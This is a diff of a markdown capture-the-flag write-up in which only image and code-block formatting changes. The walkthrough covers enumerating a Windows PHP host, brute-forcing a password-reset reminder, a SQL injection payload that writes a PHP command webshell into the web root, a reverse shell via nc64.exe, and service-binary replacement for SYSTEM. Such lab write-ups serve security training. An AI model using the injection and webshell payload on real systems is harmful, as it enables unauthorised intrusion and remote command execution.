@@ -185,11 +185,10 @@ Loads of enumeration to do. This box was full of rabbit holes to enumerate.
 
 This page was some kind of quiz thing:
 
-<figure><img src="../../../.gitbook/assets/image (1363).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1363).png>)
 
 I noticed that the `nmap` scan tells me this is a PHP site. I ran a directory scan via `gobuster` and found the `phpinfo.php` file being present:
 
-{% code overflow="wrap" %}
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://192.168.233.127:45332 -x html,php,txt -t 100 2> /dev/null
 ===============================================================
@@ -211,15 +210,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /phpinfo.php          (Status: 200) [Size: 90796]
 /phpinfo.php          (Status: 200) [Size: 90796]
 ```
-{% endcode %}
 
 On the `phpinfo.php` page, we can find the `DOCUMENT_ROOT` variable:
 
-<figure><img src="../../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(795).png>)
 
 There were also no disabled functions, which was great:
 
-<figure><img src="../../../.gitbook/assets/image (3952).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3952).png>)
 
 We might need some additional information from here later.
 
@@ -227,11 +225,11 @@ We might need some additional information from here later.
 
 Port 8000 had a BarracudaServer instance:
 
-<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(149).png>)
 
 It appears that we can set the administrator for this machine:
 
-<figure><img src="../../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(647).png>)
 
 Apart from that, we could not do anything else on this website after running directory scans on it.
 
@@ -279,63 +277,61 @@ There wasn't much in this entire directory, as it included loads of random files
 
 This website had a corporate page of some sorts:
 
-<figure><img src="../../../.gitbook/assets/image (1163).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1163).png>)
 
 There was a login page:
 
-<figure><img src="../../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(427).png>)
 
 Weak credentials don't work, and we cannot bypass this login using SQL Injection of any sort. The reset password option just leads us to another page:
 
-<figure><img src="../../../.gitbook/assets/image (3669).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3669).png>)
 
 I attempted to reset the password of the `admin` user, but it seems that it doesn't exist:
 
-<figure><img src="../../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(688).png>)
 
 If were to try with some of the users on the main page, we would trigger a different error:
 
-<figure><img src="../../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1075).png>)
 
 Here's the part I found incredibly stupid, we actually needed to brute force the users to find the correct 'reminder'. Here's the correct user after trying a load of them:
 
-<figure><img src="../../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(696).png>)
 
 Once we reset this, we can login to view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(801).png>)
 
 ### SQL Injection -> RCE
 
 Within the "Edit" function, we can see that there's a Request Profile SLUG option at the bottom:
 
-<figure><img src="../../../.gitbook/assets/image (3926).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3926).png>)
 
 This brings us to another page with a hint that MySQL was being used somehow:
 
-<figure><img src="../../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(426).png>)
 
 If we enter `'` into the URL field, we get an SQL error:
 
-<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(237).png>)
 
 Interesting. Since we basically have an SQL Interpreter here, we can make it write a webshell in PHP onto the file system. Earlier, we found that the `DOCUMENT_ROOT` of one of the web applications was at `C:\xampp\htdocs`, which we can use.
 
 We can then use this payload to write a webshell:
 
-{% code overflow="wrap" %}
 ```sql
 ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/web.php'  -- -' 
 ```
-{% endcode %}
 
 This would work, and then we can attempt to access this shell on port 45332.
 
-<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(220).png>)
 
 We can then download `nc64.exe` onto the machine and get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(327).png>)
 
 ## Privilege Escalation
 
@@ -352,7 +348,7 @@ Looking for AutoLogon credentials
 
 We can also find a possible service to exploit:
 
-<figure><img src="../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(607).png>)
 
 It appears that can modify `bd.exe`:
 
@@ -390,6 +386,6 @@ C:\bd>shutdown -r
 
 After a while, we should get a reverse shell once the machine starts up again as the SYSTEM user:
 
-<figure><img src="../../../.gitbook/assets/image (3210).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3210).png>)
 
 Rooted!
